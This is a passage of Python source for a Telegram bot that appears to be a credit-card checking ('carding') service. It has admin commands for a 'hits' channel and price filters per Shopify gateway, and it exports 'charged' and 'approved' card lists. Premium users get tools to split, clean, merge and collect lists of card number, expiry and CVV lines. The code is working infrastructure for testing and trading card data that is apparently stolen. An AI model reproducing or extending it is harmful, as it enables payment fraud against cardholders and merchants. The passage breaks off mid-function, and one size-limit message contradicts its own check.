async def set_hits_channel(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/sethits -1001234567890</code>"), parse_mode='html')
            return
        global HITS_CHANNEL_ID
        HITS_CHANNEL_ID = int(parts[1])
        await event.reply(premium_emoji(f"✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ sᴇᴛ ᴛᴏ: <code>{HITS_CHANNEL_ID}</code>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/hits'))
async def toggle_hits(event):
    if event.sender_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    global HITS_CHANNEL_ID
    if HITS_CHANNEL_ID == 0:
        await event.reply(premium_emoji("❌ Hɪᴛs ᴄʜᴀɴɴᴇʟ ɴᴏᴛ sᴇᴛ. Usᴇ /sᴇᴛʜɪᴛs"), parse_mode='html')
        return
    if HITS_CHANNEL_ID < 0:
        HITS_CHANNEL_ID = abs(HITS_CHANNEL_ID)
        await event.reply(premium_emoji("❌ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oғғ"), parse_mode='html')
    else:
        HITS_CHANNEL_ID = -abs(HITS_CHANNEL_ID)
        await event.reply(premium_emoji("✅ Hɪᴛs ᴄʜᴀɴɴᴇʟ Tᴜʀɴᴇᴅ Oɴ"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/setfilter'))
async def set_filter_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split(maxsplit=3)
        if len(parts) < 4:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/setfilter ɢᴀᴛᴇᴡᴀʏ ᴍɪɴ-ᴍᴀx \"Fɪʟᴛᴇʀ Nᴀᴍᴇ\"</code>\n\nExᴀᴍᴘʟᴇ:\n<code>/setfilter shopify_global 0-10 💰 Lᴇss ᴛʜᴀɴ $10</code>"), parse_mode='html')
            return
        gateway = parts[1]
        range_str = parts[2]
        name = parts[3].strip()
        if '-' not in range_str:
            await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ʀᴀɴɢᴇ! Usᴇ: ᴍɪɴ-ᴍᴀx"), parse_mode='html')
            return
        min_val, max_val = map(float, range_str.split('-'))
        filters = await load_price_filters()
        if gateway not in filters:
            filters[gateway] = []
        filters[gateway].append({"name": name, "min": min_val, "max": max_val})
        await save_price_filters(filters)
        await event.reply(premium_emoji(f"✅ Fɪʟᴛᴇʀ ᴀᴅᴅᴇᴅ: {name}\n💰 {min_val:.0f} - {max_val:.0f}"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/listfilters'))
async def list_filters_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    filters = await load_price_filters()
    if not filters:
        await event.reply(premium_emoji("📭 Nᴏ ғɪʟᴛᴇʀs ғᴏᴜɴᴅ."), parse_mode='html')
        return
    text = premium_emoji("🔧 <b>Pʀɪᴄᴇ Fɪʟᴛᴇʀs</b>\n\n")
    for gateway, gateway_filters in filters.items():
        text += premium_emoji(f"🛒 <b>{gateway.upper()}</b>\n")
        for i, f in enumerate(gateway_filters, 1):
            text += premium_emoji(f"   {i}. {f['name']} ({f['min']:.0f}-{f['max']:.0f})\n")
        text += "\n"
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removefilter'))
async def remove_filter_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 3:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/removefilter ɢᴀᴛᴇᴡᴀʏ ɴᴜᴍʙᴇʀ</code>\n\nExᴀᴍᴘʟᴇ:\n<code>/removefilter shopify_global 2</code>"), parse_mode='html')
            return
        gateway = parts[1].lower()
        filter_num = int(parts[2]) - 1
        filters = await load_price_filters()
        if gateway not in filters:
            await event.reply(premium_emoji(f"❌ Nᴏ ғɪʟᴛᴇʀs ғᴏʀ {gateway.upper()}!"), parse_mode='html')
            return
        if filter_num < 0 or filter_num >= len(filters[gateway]):
            await event.reply(premium_emoji(f"❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ ɴᴜᴍʙᴇʀ! Usᴇ 1-{len(filters[gateway])}"), parse_mode='html')
            return
        removed = filters[gateway].pop(filter_num)
        await save_price_filters(filters)
        await event.reply(premium_emoji(f"✅ Fɪʟᴛᴇʀ ʀᴇᴍᴏᴠᴇᴅ:\n┣ 📌 {removed['name']}\n┗ 💰 {removed['min']:.0f}-{removed['max']:.0f}"), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ ɴᴜᴍʙᴇʀ!"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        
@bot.on(events.CallbackQuery(pattern=re.compile(r"shopify_export_(charged|approved):(\d+)")))
async def shopify_export_callback(event):
    match = event.pattern_match
    export_type = match.group(1).decode()
    user_id = int(match.group(2).decode())
    
    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ʀᴇsᴜʟᴛs!", alert=True)
        return
    
    if user_id not in SHOPIFY_SESSION_RESULTS:
        await event.answer("❌ Nᴏ ʀᴇsᴜʟᴛs ғᴏᴜɴᴅ! Rᴜɴ ᴀ ᴄʜᴇᴄᴋ ғɪʀsᴛ.", alert=True)
        return
    
    user_results = SHOPIFY_SESSION_RESULTS[user_id]
    
    if export_type == "charged":
        cards_list = user_results.get('charged', [])
        filename = f"charged_cards_@mini_shopiiify_bot.txt"
        title = "CHARGED CARDS"
        emoji = "💎"
    else:
        cards_list = user_results.get('approved', [])
        filename = f"approved_cards_@mini_shopiiify_bot.txt"
        title = "APPROVED CARDS"
        emoji = "✅"
    
    if not cards_list:
        await event.answer(f"❌ Nᴏ {title.lower()} ғᴏᴜɴᴅ!", alert=True)
        return
    
    content = f"{emoji} {title}\n"
    content += "=" * 40 + "\n\n"
    
    for i, item in enumerate(cards_list, 1):
        content += f"[{i}] Cᴀʀᴅ: {item['card']}\n"
        content += f"    Rᴇsᴘᴏɴsᴇ: {item.get('message', 'N/A')[:100]}\n"
        content += f"    Gᴀᴛᴇᴡᴀʏ: {item.get('gateway', 'Unknown')}\n"
        content += f"    Pʀɪᴄᴇ: {item.get('price', '-')}\n"
        content += "-" * 30 + "\n"
    
    content += f"\n📊 Tᴏᴛᴀʟ: {len(cards_list)} ᴄᴀʀᴅs\n"
    content += f"📅 Exᴘᴏʀᴛᴇᴅ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(content)
    
    await event.answer(f"📤 Exᴘᴏʀᴛɪɴɢ {len(cards_list)} ᴄᴀʀᴅs...", alert=False)
    await bot.send_file(
        event.sender_id, 
        filename, 
        caption=premium_emoji(f"<b>{title}</b>\n Tᴏᴛᴀʟ: {len(cards_list)} ᴄᴀʀᴅs")
    )
    
    try:
        os.remove(filename)
    except:
        pass
      
@bot.on(events.CallbackQuery(pattern=re.compile(r"shopify_export_errors:(\d+)")))
async def shopify_export_errors_callback(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    
    if event.sender_id != user_id and event.sender_id not in ADMIN_ID:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ʀᴇsᴜʟᴛs!", alert=True)
        return
    
    if user_id not in SHOPIFY_SESSION_RESULTS:
        await event.answer("❌ Nᴏ ʀᴇsᴜʟᴛs ғᴏᴜɴᴅ!", alert=True)
        return
    
    user_results = SHOPIFY_SESSION_RESULTS[user_id]
    errors_list = user_results.get('errors', [])
    
    if not errors_list:
        await event.answer("❌ Nᴏ ᴇʀʀᴏʀs ғᴏᴜɴᴅ!", alert=True)
        return
    
    filename = f"errors_cards_@mini_shopiiify_bot.txt"
    title = "ERROR CARDS"
    emoji = "⚠️"
    
    content = f"{emoji} {title}\n"
    content += "=" * 40 + "\n\n"
    
    for i, item in enumerate(errors_list, 1):
        content += f"[{i}] Cᴀʀᴅ: {item['card']}\n"
        content += f"    Rᴇsᴘᴏɴsᴇ: {item.get('message', 'N/A')[:100]}\n"
        content += f"    Gᴀᴛᴇᴡᴀʏ: {item.get('gateway', 'Unknown')}\n"
        content += f"    Pʀɪᴄᴇ: {item.get('price', '-')}\n"
        content += "-" * 30 + "\n"
    
    content += f"\n📊 Tᴏᴛᴀʟ: {len(errors_list)} ᴄᴀʀᴅs\n"
    content += f"📅 Exᴘᴏʀᴛᴇᴅ: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    
    async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
        await f.write(content)
    
    await event.answer(f"📤 Exᴘᴏʀᴛɪɴɢ {len(errors_list)} ᴄᴀʀᴅs...", alert=False)
    await bot.send_file(
        event.sender_id, 
        filename, 
        caption=premium_emoji(f"<b>{title}</b>\n Tᴏᴛᴀʟ: {len(errors_list)} ᴄᴀʀᴅs")
    )
    
    try:
        os.remove(filename)
    except:
        pass
      
@bot.on(events.NewMessage(pattern='/split'))
async def split_file(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = extract_cc(content)
    if len(cards) > 10000: cards = cards[:10000]
    
    if not cards:
        await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ!"), parse_mode='html')
        os.remove(file_path)
        return
    
    TEMP_FILE_DATA[user_id] = {
        'cards': cards,
        'file_path': file_path,
        'total_cards': len(cards)
    }
    
    buttons = [
        [Button.inline("  100", f"split_size:100:{user_id}".encode(), style="primary", icon=5343636681473935403),
         Button.inline("  500", f"split_size:500:{user_id}".encode(), style="primary", icon=5343636681473935403)],
        [Button.inline("  1000", f"split_size:1000:{user_id}".encode(), style="primary", icon=5343636681473935403),
         Button.inline("  5000", f"split_size:5000:{user_id}".encode(), style="primary", icon=5343636681473935403)],
        [Button.inline(" ️ Cᴜsᴛᴏᴍ", f"split_custom:{user_id}".encode(), style="success", icon=5444931419270839381)],
        [Button.inline("  Cᴀɴᴄᴇʟ", f"split_cancel:{user_id}".encode(), style="danger", icon=4915853119839011973)]
    ]
    
    await event.reply(
        premium_emoji(f"📁 Fɪʟᴇ ʟᴏᴀᴅᴇᴅ: {len(cards)} ᴄᴀʀᴅs ғᴏᴜɴᴅ!\n\n📊 Sᴇʟᴇᴄᴛ ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ:"),
        buttons=buttons,
        parse_mode='html'
    )

@bot.on(events.CallbackQuery(pattern=rb"split_size:(\d+):(\d+)"))
async def split_size_callback(event):
    match = event.pattern_match
    chunk_size = int(match.group(1).decode())
    user_id = int(match.group(2).decode())
    
    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return
    
    if user_id not in TEMP_FILE_DATA:
        await event.edit(premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return
    
    file_data = TEMP_FILE_DATA.pop(user_id)
    cards = file_data['cards']
    file_path = file_data['file_path']
    
    if os.path.exists(file_path):
        try:
            os.remove(file_path)
        except:
            pass
    
    await event.edit(premium_emoji(f"🔄 Sᴘʟɪᴛᴛɪɴɢ {len(cards)} ᴄᴀʀᴅs ɪɴᴛᴏ {chunk_size} ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ..."), parse_mode='html')
    
    chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]
    
    for i, chunk in enumerate(chunks, 1):
        filename = f"cards_part_{i}_of_{len(chunks)}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for card in chunk:
                await f.write(f"{card}\n")
        
        await bot.send_file(
            user_id,
            filename,
            caption=premium_emoji(f" Pᴀʀᴛ {i}/{len(chunks)}\n Cᴀʀᴅs: {len(chunk)}")
        )
        
        try:
            os.remove(filename)
        except:
            pass
        
        await asyncio.sleep(2)
    
    await event.edit(premium_emoji(f"✅ Sᴘʟɪᴛ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\n📊 Tᴏᴛᴀʟ: {len(cards)} ᴄᴀʀᴅs\n📁 Fɪʟᴇs: {len(chunks)}\n📄 Cᴀʀᴅs ᴘᴇʀ ғɪʟᴇ: {chunk_size}"), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=rb"split_custom:(\d+)"))
async def split_custom_callback(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    
    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return
    
    if user_id not in TEMP_FILE_DATA:
        await event.edit(premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return
    
    await event.edit(premium_emoji("📝 Sᴇɴᴅ ᴛʜᴇ ɴᴜᴍʙᴇʀ ᴏғ ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ (10-15000):"), parse_mode='html')
    
    @bot.on(events.NewMessage(func=lambda e: e.sender_id == user_id and e.text and e.text.isdigit()))
    async def get_custom_size(msg_event):
        try:
            chunk_size = int(msg_event.text.strip())
            
            if chunk_size < 10:
                await msg_event.reply(premium_emoji("❌ Mɪɴɪᴍᴜᴍ 10 ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ!"), parse_mode='html')
                return
            
            if chunk_size > 15000:
                await msg_event.reply(premium_emoji("❌ Mᴀxɪᴍᴜᴍ 5000 ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ!"), parse_mode='html')
                return
            
            if user_id not in TEMP_FILE_DATA:
                await msg_event.reply(premium_emoji("❌ Fɪʟᴇ ᴇxᴘɪʀᴇᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
                bot.remove_event_handler(get_custom_size)
                return
            
            file_data = TEMP_FILE_DATA.pop(user_id)
            cards = file_data['cards']
            file_path = file_data['file_path']
            
            if os.path.exists(file_path):
                try:
                    os.remove(file_path)
                except:
                    pass
            
            status_msg = await msg_event.reply(premium_emoji(f"🔄 Sᴘʟɪᴛᴛɪɴɢ {len(cards)} ᴄᴀʀᴅs ɪɴᴛᴏ {chunk_size} ᴄᴀʀᴅs ᴘᴇʀ ғɪʟᴇ..."), parse_mode='html')
            
            chunks = [cards[i:i + chunk_size] for i in range(0, len(cards), chunk_size)]
            
            for i, chunk in enumerate(chunks, 1):
                filename = f"cards_part_{i}_of_{len(chunks)}.txt"
                async with aiofiles.open(filename, 'w') as f:
                    for card in chunk:
                        await f.write(f"{card}\n")
                
                await bot.send_file(
                    user_id,
                    filename,
                    caption=premium_emoji(f" Pᴀʀᴛ {i}/{len(chunks)}\n Cᴀʀᴅs: {len(chunk)}")
                )
                
                try:
                    os.remove(filename)
                except:
                    pass
                
                await asyncio.sleep(2)
            
            await status_msg.edit(premium_emoji(f"✅ Sᴘʟɪᴛ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\n📊 Tᴏᴛᴀʟ: {len(cards)} ᴄᴀʀᴅs\n📁 Fɪʟᴇs: {len(chunks)}\n📄 Cᴀʀᴅs ᴘᴇʀ ғɪʟᴇ: {chunk_size}"), parse_mode='html')
            
        except Exception as e:
            await msg_event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        finally:
            bot.remove_event_handler(get_custom_size)

@bot.on(events.CallbackQuery(pattern=rb"split_cancel:(\d+)"))
async def split_cancel_callback(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    
    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return
    
    if user_id in TEMP_FILE_DATA:
        file_data = TEMP_FILE_DATA.pop(user_id)
        if os.path.exists(file_data['file_path']):
            try:
                os.remove(file_data['file_path'])
            except:
                pass
    
    await event.edit(premium_emoji("❌ Cᴀɴᴄᴇʟʟᴇᴅ."), parse_mode='html')
    await event.answer("✅ Cᴀɴᴄᴇʟʟᴇᴅ", alert=True)
    
@bot.on(events.NewMessage(pattern='/clean'))
async def clean_file(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    
    status_msg = await event.reply(premium_emoji("🔄 Pʀᴏᴄᴇssɪɴɢ ғɪʟᴇ..."), parse_mode='html')
    
    try:
        file_path = await reply_msg.download_media()
        
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        
        os.remove(file_path)
        
        cards = extract_cc(content)
        if len(cards) > 10000 and user_id not in ADMIN_ID: cards = cards[:10000]
        
        if not cards:
            await status_msg.edit(premium_emoji("❌ Nᴏ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ!"), parse_mode='html')
            return
        
        valid_cards = []
        expired_cards = []
        invalid_lines = []
        
        current_year = datetime.now().year
        current_month = datetime.now().month
        
        for card in cards:
            parts = card.split('|')
            if len(parts) == 4:
                cc, mm, yy, cvv = parts
                try:
                    card_year = int(yy)
                    card_month = int(mm)
                    if card_year > current_year or (card_year == current_year and card_month >= current_month):
                        valid_cards.append(card)
                    else:
                        expired_cards.append(card)
                except:
                    valid_cards.append(card)
            else:
                invalid_lines.append(card)
        
        if not valid_cards and not expired_cards and not invalid_lines:
            await status_msg.edit(premium_emoji("❌ Nᴏ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ!"), parse_mode='html')
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        
        clean_filename = f"cleaned_cards_{timestamp}.txt"
        async with aiofiles.open(clean_filename, 'w') as f:
            for card in valid_cards:
                await f.write(f"{card}\n")
        
        await bot.send_file(
            user_id,
            clean_filename,
            caption=f" Cʟᴇᴀɴᴇᴅ Fɪʟᴇ\n\n Vᴀʟɪᴅ: {len(valid_cards)}"
        )
        
        try:
            os.remove(clean_filename)
        except:
            pass
        
        if expired_cards:
            expired_filename = f"expired_cards_{timestamp}.txt"
            async with aiofiles.open(expired_filename, 'w') as f:
                for card in expired_cards:
                    await f.write(f"{card}\n")
            
            await bot.send_file(
                user_id,
                expired_filename,
                caption=f" Exᴘɪʀᴇᴅ: {len(expired_cards)}"
            )
            
            try:
                os.remove(expired_filename)
            except:
                pass
        
        if invalid_lines:
            invalid_filename = f"invalid_lines_{timestamp}.txt"
            async with aiofiles.open(invalid_filename, 'w') as f:
                for line in invalid_lines:
                    await f.write(f"{line}\n")
            
            await bot.send_file(
                user_id,
                invalid_filename,
                caption=f" Iɴᴠᴀʟɪᴅ: {len(invalid_lines)}"
            )
            
            try:
                os.remove(invalid_filename)
            except:
                pass
        
        await status_msg.edit(premium_emoji(f"✅ Cʟᴇᴀɴɪɴɢ Dᴏɴᴇ!\n\n📊 Sᴜᴍᴍᴀʀʏ:\n   ┣ ✅ Vᴀʟɪᴅ: {len(valid_cards)}\n   ┣ ⏱️ Exᴘɪʀᴇᴅ: {len(expired_cards)}\n   ┗ ❌ Iɴᴠᴀʟɪᴅ: {len(invalid_lines)}"), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        
@bot.on(events.NewMessage(pattern='/merge'))
async def merge_files(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    if user_id in MERGE_DATA:
        await event.reply(premium_emoji("⚠️ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀɴ ᴀᴄᴛɪᴠᴇ ᴍᴇʀɢᴇ!"), parse_mode='html')
        return
    
    MERGE_DATA[user_id] = {
        'cards': [],
        'files': 0,
        'start_time': datetime.now(),
        'expire_time': datetime.now() + timedelta(minutes=10)
    }
    
    buttons = [
        Button.text(" MERGE", resize=True, single_use=True),
        Button.text(" +5M", resize=True, single_use=True),
        Button.text(" CANCELM", resize=True, single_use=True)
    ]
    
    await event.reply(
        premium_emoji(f"📂 Mᴇʀɢᴇ Mᴏᴅᴇ Aᴄᴛɪᴠᴀᴛᴇᴅ!\n\n⏱️ Tɪᴍᴇ Lᴇғᴛ: 10 ᴍɪɴᴜᴛᴇs\n📁 Fɪʟᴇs: 0\n💳 Cᴀʀᴅs: 0\n\nSᴇɴᴅ ᴍᴇ .ᴛxᴛ ғɪʟᴇs ᴀɴᴅ ᴘʀᴇss MERGE ᴛᴏ ғɪɴɪsʜ."),
        buttons=buttons,
        parse_mode='html'
    )
    
    if user_id in MERGE_TIMERS:
        MERGE_TIMERS[user_id].cancel()
    
    async def auto_cancel():
        await asyncio.sleep(600)
        if user_id in MERGE_DATA:
            MERGE_DATA.pop(user_id, None)
            try:
                await bot.send_message(user_id, premium_emoji("⏰ Mᴇʀɢᴇ ᴇxᴘɪʀᴇᴅ ᴀғᴛᴇʀ 10 ᴍɪɴᴜᴛᴇs!"), parse_mode='html')
            except:
                pass
    
    MERGE_TIMERS[user_id] = asyncio.create_task(auto_cancel())

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "MERGE"))
async def merge_button(event):
    user_id = event.sender_id
    
    if user_id not in MERGE_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴍᴇʀɢᴇ!"), parse_mode='html')
        return
    
    data = MERGE_DATA.pop(user_id)
    cards = data['cards']
    
    if user_id in MERGE_TIMERS:
        MERGE_TIMERS[user_id].cancel()
        MERGE_TIMERS.pop(user_id, None)
    
    if not cards:
        await event.reply(premium_emoji("❌ Nᴏ ᴄᴀʀᴅs ᴄᴏʟʟᴇᴄᴛᴇᴅ!"), parse_mode='html')
        return
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"merged_cards_{timestamp}.txt"
    
    async with aiofiles.open(filename, 'w') as f:
        for card in cards:
            await f.write(f"{card}\n")
    
    await bot.send_file(
        user_id,
        filename,
        caption=premium_emoji(f" Mᴇʀɢᴇ Cᴏᴍᴘʟᴇᴛᴇ!\n\n Fɪʟᴇs Mᴇʀɢᴇᴅ: {data['files']}\n Tᴏᴛᴀʟ Cᴀʀᴅs: {len(cards)}")
    )
    
    try:
        os.remove(filename)
    except:
        pass
    
    await event.reply(premium_emoji(f"✅ Mᴇʀɢᴇᴅ {len(cards)} ᴄᴀʀᴅs ғʀᴏᴍ {data['files']} ғɪʟᴇs!"), parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "+5M"))
async def extend_merge(event):
    user_id = event.sender_id
    
    if user_id not in MERGE_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴍᴇʀɢᴇ!"), parse_mode='html')
        return
    
    data = MERGE_DATA[user_id]
    data['expire_time'] = data['expire_time'] + timedelta(minutes=5)
    
    remaining = int((data['expire_time'] - datetime.now()).total_seconds() / 60)
    
    await event.reply(premium_emoji(f"⏱️ +5 ᴍɪɴᴜᴛᴇs ᴀᴅᴅᴇᴅ!\n📊 Rᴇᴍᴀɪɴɪɴɢ: {remaining} ᴍɪɴᴜᴛᴇs"), parse_mode='html')

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "CANCELM"))
async def cancel_merge(event):
    user_id = event.sender_id
    
    if user_id not in MERGE_DATA:
        await event.reply(premium_emoji("❌ Nᴏ ᴀᴄᴛɪᴠᴇ ᴍᴇʀɢᴇ!"), parse_mode='html')
        return
    
    MERGE_DATA.pop(user_id, None)
    
    if user_id in MERGE_TIMERS:
        MERGE_TIMERS[user_id].cancel()
        MERGE_TIMERS.pop(user_id, None)
    
    await event.reply(premium_emoji("❌ Mᴇʀɢᴇ Cᴀɴᴄᴇʟʟᴇᴅ!"), parse_mode='html')

@bot.on(events.NewMessage)
async def merge_handler(event):
    user_id = event.sender_id
    
    if user_id not in MERGE_DATA:
        return
    
    if not event.text:
        return
    
    if event.text.upper() in ["MERGE", "+5M", "CANCELM", "COLLECT", "+5 MIN", "CANCEL"]:
        return
    
    if not event.reply_to_msg_id:
        return
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    os.remove(file_path)
    
    cards = extract_cc(content)
    if len(cards) > 10000: cards = cards[:10000]
    
    if not cards:
        return
    
    data = MERGE_DATA[user_id]
    data['cards'].extend(cards)
    data['files'] += 1


@bot.on(events.NewMessage(pattern='/collect'))
async def collect_cards(event):
    user_id = event.sender_id
    
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    
    if user_id in COLLECT_DATA:
        await event.reply(premium_emoji("⚠️ Yᴏᴜ ᴀʟʀᴇᴀᴅʏ ʜᴀᴠᴇ ᴀɴ ᴀᴄᴛɪᴠᴇ ᴄᴏʟʟᴇᴄᴛɪᴏɴ!"), parse_mode='html')
        return
    
    COLLECT_DATA[user_id] = {
        'cards': [],
        'start_time': datetime.now(),
        'expire_time': datetime.now() + timedelta(minutes=10)
    }
    
    buttons = [
        Button.text(" COLLECT", resize=True, single_use=True),
        Button.text(" +5 MIN", resize=True, single_use=True),
        Button.text(" CANCEL", resize=True, single_use=True)
    ]
    
    await event.reply(
        premium_emoji(f"📥 Cᴏʟʟᴇᴄᴛɪᴏɴ Mᴏᴅᴇ Aᴄᴛɪᴠᴀᴛᴇᴅ!\n\n⏱️ Tɪᴍᴇ Lᴇғᴛ: 10 ᴍɪɴᴜᴛᴇs\n💳 Cᴀʀᴅs: 0\n\nSᴇɴᴅ ᴍᴇ ᴄᴀʀᴅs ᴀɴᴅ ᴘʀᴇss COLLECT ᴛᴏ ғɪɴɪsʜ."),
        buttons=buttons,
        parse_mode='html'
    )
    
    if user_id in COLLECT_TIMERS:
        COLLECT_TIMERS[user_id].cancel()
    
    async def auto_cancel():
        await asyncio.sleep(600)
        if user_id in COLLECT_DATA:
            data = COLLECT_DATA.pop(user_id, None)
            try:
                await bot.send_message(user_id, premium_emoji("⏰ Cᴏʟʟᴇᴄᴛɪᴏɴ ᴇxᴘɪʀᴇᴅ ᴀғᴛᴇʀ 10 ᴍɪɴᴜᴛᴇs!"), parse_mode='html')
            except:
                pass
    
    COLLECT_TIMERS[user_id] = asyncio.create_task(auto_cancel())

@bot.on(events.NewMessage(func=lambda e: e.text and e.text.upper() == "COLLECT"))
async def collect_button(event):
    user_id = event.sender_id
    
    if user_id not in COLLECT_DATA:
